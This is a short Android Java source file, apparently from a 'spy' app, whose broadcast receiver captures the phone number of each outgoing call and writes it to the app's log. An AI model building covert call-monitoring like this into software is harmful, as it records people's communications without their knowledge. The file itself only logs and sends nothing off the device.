package com.spyapp.android.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

import com.spyapp.android.SpyApp;

public class OutgoingCallReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        String outgoingNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
        SpyApp.log("Outgoing call to " + outgoingNumber);
    }
}